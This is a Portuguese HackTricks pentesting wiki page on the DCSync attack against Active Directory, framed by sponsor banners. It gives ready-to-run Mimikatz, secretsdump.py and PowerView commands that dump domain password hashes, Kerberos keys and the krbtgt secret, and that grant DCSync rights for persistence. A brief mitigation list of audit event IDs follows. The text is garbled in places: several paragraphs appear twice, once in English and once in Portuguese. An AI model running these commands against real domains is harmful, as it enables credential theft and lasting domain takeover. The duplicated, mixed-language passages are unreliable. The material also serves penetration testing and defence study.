# DCSync

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## DCSync

A permissão **DCSync** implica ter essas permissões sobre o próprio domínio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.

**Notas importantes sobre o DCSync:**

* O ataque **DCSync simula o comportamento de um Controlador de Domínio e solicita que outros Controladores de Domínio repliquem informações** usando o Protocolo Remoto de Serviço de Replicação de Diretório (MS-DRSR). Como o MS-DRSR é uma função válida e necessária do Active Directory, ele não pode ser desativado ou desabilitado.
* Por padrão, apenas os grupos **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** têm as permissões necessárias.
* Se alguma senha de conta for armazenada com criptografia reversível, há uma opção disponível no Mimikatz para retornar a senha em texto claro.

### Enumeração

Verifique quem possui essas permissões usando `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Explorar Localmente

To exploit a Windows Active Directory environment locally, an attacker can use the DCSync technique. This technique allows the attacker to impersonate a domain controller and request the replication of password hashes from the targeted domain controller.

To perform a DCSync attack, the attacker needs to have administrative privileges on a compromised machine within the domain. Once access is gained, the attacker can use the `mimikatz` tool to execute the DCSync command and retrieve the password hashes.

The DCSync command can be executed using the following syntax:

```
mimikatz # lsadump::dcsync /domain:<domain_name> /user:<username>
```

Replace `<domain_name>` with the name of the target domain and `<username>` with the username of the account whose password hash is to be retrieved.

By exploiting the DCSync technique locally, an attacker can obtain the password hashes of domain user accounts. These password hashes can then be cracked using various password cracking tools to gain unauthorized access to user accounts and escalate privileges within the Active Directory environment.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explorar Remotamente

To exploit the DCSync attack remotely, an attacker needs to have remote access to a domain-joined machine or a compromised user account with sufficient privileges. The attack can be performed using tools like Mimikatz or Impacket.

Para explorar o ataque DCSync remotamente, um invasor precisa ter acesso remoto a uma máquina associada ao domínio ou a uma conta de usuário comprometida com privilégios suficientes. O ataque pode ser realizado usando ferramentas como Mimikatz ou Impacket.

The attacker can use the DCSync attack to retrieve the NTLM hash of a specific user account from the targeted domain controller. This can be done by impersonating a domain controller and requesting the replication of the targeted user's credentials. Once the NTLM hash is obtained, it can be used for various malicious purposes, such as password cracking or lateral movement within the network.

O invasor pode usar o ataque DCSync para recuperar o hash NTLM de uma conta de usuário específica do controlador de domínio alvo. Isso pode ser feito ao se passar por um controlador de domínio e solicitar a replicação das credenciais do usuário alvo. Uma vez obtido o hash NTLM, ele pode ser usado para diversos fins maliciosos, como quebra de senha ou movimentação lateral dentro da rede.

It is important to note that the DCSync attack requires administrative privileges on the domain controller or the ability to impersonate a domain controller. Therefore, it is crucial to implement strong security measures, such as least privilege access control and regular monitoring, to prevent and detect such attacks.

É importante observar que o ataque DCSync requer privilégios administrativos no controlador de domínio ou a capacidade de se passar por um controlador de domínio. Portanto, é crucial implementar medidas de segurança robustas, como controle de acesso com privilégios mínimos e monitoramento regular, para prevenir e detectar tais ataques.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
&#x20;`-just-dc` gera 3 arquivos:

* um com os **hashes NTLM**
* um com as **chaves Kerberos**
* um com as senhas em texto claro do NTDS para qualquer conta configurada com [**criptografia reversível**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) habilitada. Você pode obter usuários com criptografia reversível com&#x20;

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistência

Se você é um administrador de domínio, pode conceder essas permissões a qualquer usuário com a ajuda do `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Em seguida, você pode **verificar se o usuário foi atribuído corretamente** as 3 permissões procurando por elas na saída de (você deve ser capaz de ver os nomes das permissões dentro do campo "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigação

* Evento de Segurança ID 4662 (A política de auditoria para o objeto deve estar habilitada) - Uma operação foi realizada em um objeto
* Evento de Segurança ID 5136 (A política de auditoria para o objeto deve estar habilitada) - Um objeto de serviço de diretório foi modificado
* Evento de Segurança ID 4670 (A política de auditoria para o objeto deve estar habilitada) - As permissões em um objeto foram alteradas
* AD ACL Scanner - Crie e compare relatórios de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referências

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
